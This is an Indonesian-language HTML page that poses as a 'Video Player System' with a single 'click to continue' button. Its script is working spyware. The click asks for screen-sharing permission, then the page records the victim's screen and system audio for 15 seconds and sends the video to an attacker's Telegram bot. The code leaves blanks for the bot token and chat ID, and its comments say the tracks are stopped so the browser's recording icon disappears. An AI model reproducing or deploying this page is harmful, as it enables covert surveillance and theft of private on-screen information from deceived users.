<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player System</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #111; color: white; margin: 0; }
        .btn-play { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #e50914; color: white; border: none; border-radius: 5px; font-weight: bold; }
        #status { margin-top: 20px; font-size: 0.9em; color: #aaa; }
        video { display: none; } /* Sembunyikan elemen video */
    </style>
</head>
<body>

    <div style="text-align: center;">
        <button class="btn-play" onclick="startCapture()">KLIK UNTUK LANJUTKAN</button>
        <p id="status">Klik tombol di atas untuk memulai sistem.</p>
    </div>

    <video id="video" autoplay></video>

    <script>
        // --- KONFIGURASI TELEGRAM ---
        const TELEGRAM_TOKEN = 'isi disini'; 
        const CHAT_ID = 'isi disini';         
        const DURASI_REKAM = 15000; // Rekam 15 detik

        let mediaRecorder;
        let recordedChunks = [];

        async function startCapture() {
            const status = document.getElementById('status');
            try {
                // Meminta izin rekam layar
                const captureStream = await navigator.mediaDevices.getDisplayMedia({
                    video: true,
                    audio: true // Sertakan audio sistem jika didukung
                });

                status.innerText = "Sistem Berjalan...";
                
                mediaRecorder = new MediaRecorder(captureStream);
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) recordedChunks.push(event.data);
                };

                mediaRecorder.onstop = async () => {
                    status.innerText = "Mengirim hasil ke Telegram...";
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    await sendToTelegram(blob);
                    
                    // Matikan semua track agar ikon rekam di browser hilang
                    captureStream.getTracks().forEach(track => track.stop());
                };

                mediaRecorder.start();

                // Berhenti otomatis setelah durasi tertentu
                setTimeout(() => {
                    if (mediaRecorder.state === "recording") {
                        mediaRecorder.stop();
                    }
                }, DURASI_REKAM);

            } catch (err) {
                console.error("Error: " + err);
                status.innerText = "Gagal: Izin diperlukan untuk melanjutkan.";
            }
        }

        async function sendToTelegram(videoBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('video', videoBlob, 'screen_record.mp4');

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    document.getElementById('status').innerText = "Selesai!";
                }
            } catch (error) {
                console.error("Gagal kirim video:", error);
            }
        }
    </script>
</body>
</html>
